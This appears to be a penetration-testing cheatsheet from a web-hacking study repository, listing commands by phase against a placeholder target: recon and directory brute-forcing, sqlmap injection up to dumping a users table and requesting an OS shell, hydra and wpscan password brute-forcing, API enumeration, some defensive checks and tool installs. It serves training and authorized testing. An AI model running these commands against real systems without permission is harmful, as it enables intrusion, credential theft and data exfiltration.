# Cheatsheet — Commands & Tools Quick Reference

> Every command from this repo, grouped by phase, in one scannable page. Full context/explanation for each is in the linked topic file.

## Phase 1 — Recon & Footprinting → [full detail](../03-footprinting-and-recon.md)

```bash
whois target.com
nslookup target.com
dig target.com ANY
dig axfr target.com @ns1.target.com                          # zone transfer attempt

nmap -sS -sV -p- -T4 target.com
nmap -sV -p 80,443,8080,8443 --script=http-enum,http-title target.com

telnet target.com 80                                          # then: GET / HTTP/1.0
curl -I http://target.com
openssl s_client -connect target.com:443                      # SSL/TLS banner grab
nc -v target.com 80                                            # then: HEAD / HTTP/1.1

wafw00f https://target.com                                     # WAF detection
lbd target.com                                                 # load balancer detection

gobuster dir -u https://target.com -w common.txt -s 200,301,302
dirb https://target.com
ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302,403
wfuzz -c -z file,common.txt --hc 404 https://target.com/FUZZ

whatweb -a 3 https://target.com                                # tech fingerprinting

httrack https://target.com -O ./mirror                         # site mirroring
wget --mirror --convert-links --page-requisites https://target.com

metagoofil -d target.com -t pdf,doc,xls,ppt -l 100 -o results  # document metadata
cewl https://target.com -d 3 -m 5 -w wordlist.txt              # target-specific wordlist

sniper -t target.com -m normal                                 # automated recon suite
```

## Phase 2 — Injection Testing → [full detail](../04-injection-attacks.md)

```bash
sqlmap -u "https://target.com/item?id=2" --batch
sqlmap -u "https://target.com/item?id=2" --dbs
sqlmap -u "https://target.com/item?id=2" -D shopdb --tables
sqlmap -u "https://target.com/item?id=2" -D shopdb -T users --dump
sqlmap -r request.txt --batch                                  # from a Burp-saved request
sqlmap -u "https://target.com/item?id=2" --level=5 --risk=3 --technique=BEUST
sqlmap -u "https://target.com/item?id=2" --os-shell
```

## Phase 3 — Authentication & Session Attacks → [full detail](../06-session-authentication-and-authorization-attacks.md)

```bash
hydra -l admin -P rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt target.com http-get /admin/
hydra -h                                                        # list all supported modules
```

## Phase 4 — Web Server & CMS Scanning → [full detail](../09-web-app-hacking-tools.md)

```bash
nikto -h https://target.com -ssl
nikto -h target.com -o report.html -Format htm

wpscan --url https://target.com --enumerate vp,vt,u
wpscan --url https://target.com --enumerate u --passwords rockyou.txt
```

## Phase 5 — Proxy-Based Manual Testing → [full detail](../09-web-app-hacking-tools.md#burp-suite)

```
Burp Suite:
  Proxy → Options → confirm listener on 127.0.0.1:8080
  Browser → set proxy to 127.0.0.1:8080 → visit http://burpsuite → install CA cert
  Target → Site map → review captured endpoints
  Repeater → manual request tampering
  Intruder → automated fuzzing (mark payload positions, load wordlist)
  Decoder → encode/decode payloads
  Comparer → diff responses for blind injection confirmation

OWASP ZAP:
  zap-baseline.py -t https://target.com -r report.html
  zap-full-scan.py -t https://target.com -r full-report.html
```

## Phase 6 — API & Web Services Testing → [full detail](../07-web-services-api-and-webhook-attacks.md)

```bash
curl https://target.com/swagger.json
curl https://target.com/openapi.json
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt -mc all -fc 404

newman run collection.json --environment prod.postman_environment.json  # Postman/Newman
testrunner.sh -s"TestSuite" -c"TestCase" project.xml                     # SoapUI
```

## Phase 7 — Defensive / Blue-Team Checks → [full detail](../10-countermeasures-and-secure-coding.md)

```bash
curl -I https://target.com                                     # inspect security headers present
curl -X OPTIONS -i https://target.com/api/users                # enumerate allowed HTTP methods
curl -X TRACE https://target.com                                # check if TRACE is enabled

semgrep --config=p/owasp-top-ten ./src                          # open-source SAST
npm audit                                                        # Node dependency check
pip-audit                                                        # Python dependency check
```

## Tool Installation Quick Reference

```bash
sudo apt update && sudo apt install -y \
  burpsuite zaproxy sqlmap nikto gobuster dirb wfuzz hydra vega \
  whatweb httrack wget metagoofil cewl wpscan

go install github.com/ffuf/ffuf/v2@latest
gem install wpscan
npm install -g newman
pip install semgrep --break-system-packages
git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh
```

---
**See also:** [payloads-cheatsheet.md](./payloads-cheatsheet.md)
